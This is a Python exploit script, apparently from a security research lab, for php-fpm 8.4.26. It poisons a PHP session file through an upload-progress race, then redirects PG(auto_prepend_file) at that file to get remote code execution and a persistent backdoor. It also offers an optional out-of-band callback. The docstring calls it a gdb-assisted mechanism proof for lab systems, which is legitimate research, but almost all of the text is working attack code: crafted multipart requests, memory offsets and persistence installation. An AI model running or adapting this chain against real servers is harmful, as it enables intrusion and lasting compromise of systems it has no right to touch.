#!/usr/bin/env python3
"""php-fpm auto_prepend_file persistence via session-upload-progress poison.

Composes an app-free/socket-free RCE over plain nginx->php-fpm HTTP:
  1. a PHP_SESSION_UPLOAD_PROGRESS multipart storm writes attacker PHP into
     save_path/sess_<sid> on disk (poison half of the upload-progress primitive),
  2. ONE write redirects PG(auto_prepend_file) (core_globals+0xa0) at that file,
  3. a plain GET that emits the poison marker is the sink-free success oracle
     (also used to confirm a candidate binbase by write-and-check).
Precondition: vulnerable php-fpm, no app include, no reachable FCGI socket.

RESEARCH: the clean 8-byte PG write8 is a gdb mechanism proof; the single
arbitrary-write CVE primitive cannot land this field cleanly (16-byte width
pollutes PG(auto_append_file)@+0xa8, and needs a /proc chunk+binbase seed). Not
a black-box landed RCE. Pure stdlib, python3 -I safe. Lab use, systems you own.
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import socket
import subprocess
import sys
import time
from urllib.parse import quote

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)
from common import proc_gdb  # noqa: E402
from common.offsets import load_offsets  # noqa: E402


def _load(name, filename):
    """Import a committed poc module read-only (private, isolated instance)."""
    path = os.path.join(_HERE, filename)
    if not os.path.exists(path):
        path = os.path.join(_POC_ROOT, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    for _p in (_HERE, _POC_ROOT):
        if _p not in sys.path:
            sys.path.insert(0, _p)
    sys.modules.setdefault(name, mod)
    spec.loader.exec_module(mod)
    return mod


# --- read-only imports of the shared primitives ----------------------------
pg_persist = _load("auto_prepend_persist", "primitives/dispatch/auto_prepend_persist.py")
_cw = _load("fpm_clean_pg_write", "primitives/write/fpm_clean_pg_write.py")
race = _load("include_race", "routes/include_race.py")
oob_retrieve = _load("oob_output", "primitives/dispatch/oob_output.py")
_oracle = _load("auto_include_fire_oracle", "primitives/oracles/auto_include_fire_oracle.py")
# Arbitrary-write backend, imported read-only for the /proc-seed reporting below;
# the CVE write is NOT the landing transport here (see var_hash_rw_write_note()).
try:
    functable_resolver = _load("functable_resolver", "primitives/read_leak/functable_resolver.py")
except Exception:                                   # pragma: no cover
    functable_resolver = None


# php-fpm 8.4.26 PG offsets -- sourced from the single canonical table in common/offsets.py
# (BUILTIN_OFFSETS["8.4.26-fpm"], selected by the fpm-fcgi SAPI). These were
# derived on /usr/local/sbin/php-fpm (an exported OBJECT symbol: readelf -sW
# php-fpm | grep core_globals -> 0x16e1580, 616-byte struct), cross-checked
# against basic_globals 0x16cc640 (== the fpm bg_unserialize base) and
# executor_globals 0x16e22c0; the +0xa0/+0xa8 field offsets are source-stable
# (main/php_globals.h). pg_scratch is the zeroed, mapped tail of the last RW
# PT_LOAD (0x16e8ab0..0x16e9000), parked at 0x16e8b00.
_FPM_OFF = load_offsets("8.4.26", "fpm-fcgi")
FPM_8426_CORE_GLOBALS = _FPM_OFF["core_globals_off"]
FPM_8426_OFFSETS = {
    "auto_prepend_off": _FPM_OFF["auto_prepend_off"],
    "auto_append_off":  _FPM_OFF["auto_append_off"],
    "bss_anchors":      _FPM_OFF["bss_anchors"],
    "pg_scratch_off":   _FPM_OFF["pg_scratch_off"],
    "pg_scratch_limit": _FPM_OFF["pg_scratch_limit"],
}

MARK_S, MARK_E = race.MARK_S, race.MARK_E


# docker helpers (lab instrumentation only -- /proc + gdb live inside the fpm
# container; the attacker surface is still just nginx HTTP)
def _dc(compose_file, *args, timeout=60, text=True):
    cmd = ["docker", "compose", "-f", compose_file, *args]
    return subprocess.run(cmd, capture_output=True, text=text, timeout=timeout)


def _exec(compose_file, service, *argv, timeout=60):
    return _dc(compose_file, "exec", "-T", service, *argv, timeout=timeout)


worker_pids = proc_gdb.worker_pids
derive_core_globals = proc_gdb.derive_core_globals
fpm_base_of = proc_gdb.fpm_base_of
proc_seed = proc_gdb.proc_seed


def var_hash_rw_write_note():
    """Why the landing proof does NOT use the var_hash_rw CVE write as the PG transport.
    Two structural facts, both honest gaps the oracle does not close:

      1. SEED: the var_hash_rw groom needs chunk + binbase (seed =
         chunk+binbase from /proc). The auto_prepend oracle makes CONFIRMATION
         of a guess sink-free, but cannot DISCOVER these from nothing: over
         fork-fixed fpm ASLR a single axis is ~2^28, the joint (chunk,binbase)
         ~2^56 -- a from-scratch brute force is infeasible. So in the lab they
         stay /proc-seeded.
      2. WIDTH: the var_hash_rw write is 16 bytes (value@+0, IS_LONG type_info@+8). A
         write to PG(auto_prepend_file) @ core_globals+0xa0 therefore stamps
         IS_LONG (4) into the adjacent PG(auto_append_file) @ +0xa8 -> a
         (char*)4 the next request's auto_append deref SIGSEGVs on. The var_hash_rw write
         does NOT provide the CLEAN 8-byte write8 pg_persist assumes for this
         field (pg_persist_partial's 4-byte low-half variant needs a non-NULL
         matching-high32 starting value, absent on a stock NULL field).

    The clean write8 therefore comes from gdb here (pg_persist's sanctioned
    mechanism-proof transport), standing in for a genuinely clean primitive (the
    forged-dtor on Apache lands exactly this). The oracle's sink-free
    discrimination is proven independent of the write transport."""
    return var_hash_rw_write_note.__doc__


# write8 backends
GdbWrite8 = _cw.GdbWrite8


# phase 1: race poison (app-free, socket-free, leak-free on-disk write)
def poison(host, port, cmd, sid, save_path="/var/sess", parts=5000,
           base="/plain.php", oob_url=None, verbose=True):
    """Write attacker PHP into save_path/sess_<sid> via the upload-progress race.

    Uses upload_progress_include_race's own poison builders read-only. We do NOT
    use its include-read path (the target app has no includable param). Returns
    the on-disk path of the poisoned session file."""
    payload_cmd = cmd
    if oob_url:
        payload_cmd = oob_retrieve.wrap_command(cmd, oob_url)
    key = race.make_key(payload_cmd)
    body = race.build_storm_body(key, parts=parts)
    cookie = f"PHPSESSID={sid}"
    hdr = (f"POST {base} HTTP/1.1\r\nHost: {host}\r\n"
           f"Content-Type: multipart/form-data; boundary={race.BOUND}\r\n"
           f"Content-Length: {len(body)}\r\nCookie: {cookie}\r\n"
           f"Connection: close\r\n\r\n").encode()
    if verbose:
        print(f"[poison] storm {len(body)} B -> {base} (sid={sid}, {parts} parts)")
    try:
        with socket.create_connection((host, port), timeout=30) as s:
            s.sendall(hdr + body)
            race._recv_all(s, 15)
    except OSError as e:
        print(f"[poison] transport error: {e!r}")
    return f"{save_path.rstrip('/')}/sess_{sid}"


def read_sess_file(compose_file, service, sess_path):
    """Lab check: dump the poisoned session file to confirm the payload landed."""
    r = _exec(compose_file, service, "sh", "-c",
              f"cat {sess_path} 2>/dev/null | head -c 400")
    return r.stdout if r.returncode == 0 else None


# phase 3: the sink-free auto_prepend success ORACLE
plain_probe = _oracle.plain_probe
oracle_fired = _oracle.oracle_fired
oracle_output = _oracle.oracle_output
confirm_rce = _oracle.confirm_rce


# the research routine: oracle-driven binbase CONFIRMATION (sink-free)
def oracle_search(host, port, compose_file, service, sess_path, candidates,
                  base="/plain.php", sid=None, verbose=True):
    """Confirm the true php-fpm binbase by WRITE-AND-CHECK against the auto_prepend
    oracle -- NO reflecting-unserialize sink anywhere.

    For each candidate base we install PG(auto_prepend_file) -> sess_path at
    (base + auto_prepend_off) on ALL workers, then fire a plain GET. If the
    oracle fires, the candidate's core_globals vaddr was correct -> base
    confirmed. A wrong candidate writes a stray address (no fire) and is
    rejected. Returns (confirmed_base_or_None, probes, trail)."""
    trail = []
    probes = 0
    for cand in candidates:
        w = GdbWrite8(compose_file, service, verbose=False)
        try:
            pg_persist.install(cand, FPM_8426_OFFSETS, w.write8, sess_path)
        except Exception as e:
            trail.append((cand, "install-error", repr(e)))
            continue
        ok, _out, p = confirm_rce(host, port, base=base, sid=sid, tries=2,
                                  verbose=False)
        probes += p
        trail.append((cand, "FIRED" if ok else "silent", p))
        if verbose:
            print(f"[search] base {cand:#x}: {'FIRED' if ok else 'silent'} "
                  f"({p} probe(s))")
        # reset PG to NULL before trying the next candidate so a stale hit from
        # a prior candidate cannot be misattributed
        try:
            pg_persist.uninstall(cand, FPM_8426_OFFSETS, w.write8)
        except Exception:
            pass
        if ok:
            # reinstall the confirmed base so the backdoor is live on return
            pg_persist.install(cand, FPM_8426_OFFSETS, w.write8, sess_path)
            return cand, probes, trail
    return None, probes, trail


# full orchestration
def run(host, port, compose_file, service, cmd="id", save_path="/var/sess",
        sid=None, parts=5000, base="/plain.php", restrict_worker=None,
        use_oob=False, oob_host=None, verbose=True):
    """race-poison -> derive core_globals -> single clean write8 to
    PG(auto_prepend_file) -> confirm RCE via the plain-request oracle.

    Returns a dict report. The PG write transport is the gdb-assisted clean
    write8 (mechanism proof); see the module docstring for why the 16-byte
    single-write primitive cannot land this field cleanly, and what remains
    /proc-seeded."""
    rep = {"host": host, "port": port, "service": service, "cmd": cmd}
    if not sid:
        sid = "0123456789abcdef0123456789abcdef"
    rep["sid"] = sid

    # oob collector (optional blind confirmation)
    oob = None
    oob_url = None
    if use_oob:
        oob = oob_retrieve.OOBListener(host="0.0.0.0")
        oob_url = oob.url_for(oob_host or "172.17.0.1")
        rep["oob_url"] = oob_url

    # --- derive the php-fpm core_globals vaddr + per-worker base ---
    cg, how = derive_core_globals(compose_file, service)
    rep["core_globals_vaddr"] = cg
    rep["core_globals_how"] = how
    if cg is None:
        rep["error"] = "could not derive core_globals"
        return rep
    if cg != FPM_8426_CORE_GLOBALS and verbose:
        print(f"[grail] WARNING: derived core_globals {cg:#x} != baked "
              f"{FPM_8426_CORE_GLOBALS:#x}; using derived")
    off = dict(FPM_8426_OFFSETS)
    off["auto_prepend_off"] = cg + 0xa0
    off["auto_append_off"] = cg + 0xa8

    pids = worker_pids(compose_file, service)
    rep["worker_pids"] = pids
    if not pids:
        rep["error"] = "no fpm workers found"
        return rep
    base_addr = fpm_base_of(compose_file, service, pids[0])
    rep["fpm_base"] = base_addr
    if base_addr is None:
        rep["error"] = "could not read php-fpm base from /proc"
        return rep
    pg_apf = base_addr + off["auto_prepend_off"]
    rep["pg_auto_prepend_file_vaddr"] = pg_apf
    # honest boundary: the two inputs the single-write CVE primitive would
    # consume, and that they come from /proc (not disclosed app-free). Reporting only.
    rep["var_hash_rw_seed_proc"] = proc_seed(compose_file, service, pids[0])
    rep["var_hash_rw_write_transport_note"] = ("var_hash_rw CVE write NOT used as PG transport: "
        "16-byte write pollutes PG(auto_append_file)@+0xa8 + needs /proc chunk+"
        "binbase seed; clean write8 is gdb (mechanism proof). See var_hash_rw_write_note().")
    if verbose:
        print(f"[grail] core_globals={cg:#x} fpm_base={base_addr:#x} "
              f"PG(auto_prepend_file)={pg_apf:#x}")

    # --- phase 1: race poison (app-free on-disk write) ---
    sess_path = poison(host, port, cmd, sid, save_path=save_path, parts=parts,
                       base=base, oob_url=oob_url, verbose=verbose)
    rep["sess_path"] = sess_path
    disk = read_sess_file(compose_file, service, sess_path)
    rep["poison_on_disk"] = bool(disk and MARK_S in (disk or ""))
    rep["poison_preview"] = (disk or "")[:200]
    if verbose:
        print(f"[grail] poison on disk: {rep['poison_on_disk']} "
              f"({sess_path})")

    # --- phase 2: ONE clean write8 -> PG(auto_prepend_file) (all workers) ---
    restrict = None
    if restrict_worker is not None:
        restrict = [pids[restrict_worker % len(pids)]]
        rep["restricted_to_pid"] = restrict[0]
    w = GdbWrite8(compose_file, service, restrict=restrict, verbose=verbose)
    tgt, str_addr = pg_persist.install(base_addr, off, w.write8, sess_path)
    rep["write8_calls"] = w.writes
    rep["pg_string_addr"] = str_addr
    if verbose:
        print(f"[grail] installed PG(auto_prepend_file)@{tgt:#x} -> "
              f"{str_addr:#x} ({w.writes} write8 calls)")

    # --- phase 3: sink-free oracle confirmation ---
    ok, out, probes = confirm_rce(host, port, base=base, sid=sid, tries=8,
                                  oob=oob, verbose=verbose)
    rep["rce_ok"] = ok
    rep["cmd_output"] = (out or "").strip()
    rep["oracle_probes"] = probes
    if oob is not None:
        oob.close()
    return rep


def main(argv=None):
    ap = argparse.ArgumentParser(
        description="grail: race-poison + PG(auto_prepend_file) + sink-free oracle")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8134)
    ap.add_argument("--compose-file",
                    default=os.path.join(os.path.dirname(os.path.dirname(_HERE)),
                                         "docker-compose.fpm-avenues.yml"))
    ap.add_argument("--service", default="grail-fpm")
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--save-path", default="/var/sess")
    ap.add_argument("--sid", default="0123456789abcdef0123456789abcdef")
    ap.add_argument("--parts", type=int, default=5000)
    ap.add_argument("--base", default="/plain.php")
    ap.add_argument("--restrict-worker", type=int, default=None,
                    help="install PG on only the Nth worker pid (prove pinning)")
    ap.add_argument("--oob", action="store_true", help="also use an oob callback")
    ap.add_argument("--oob-host", default="172.17.0.1")
    ap.add_argument("--quiet", action="store_true")
    a = ap.parse_args(argv)

    # grouped-compose isolation (the shared _dc helper inherits os.environ; it is
    # left project-agnostic because other avenues import this module).
    os.environ["COMPOSE_FILE"] = a.compose_file
    os.environ["COMPOSE_PROJECT_NAME"] = "p2s-grail"
    os.environ["COMPOSE_PROFILES"] = "grail"

    import json
    rep = run(a.host, a.port, a.compose_file, a.service, cmd=a.cmd,
              save_path=a.save_path, sid=a.sid, parts=a.parts, base=a.base,
              restrict_worker=a.restrict_worker, use_oob=a.oob,
              oob_host=a.oob_host, verbose=not a.quiet)
    print(json.dumps(rep, indent=2, default=lambda o: hex(o)
                     if isinstance(o, int) else str(o)))
    return 0 if rep.get("rce_ok") else 1


if __name__ == "__main__":
    raise SystemExit(main())
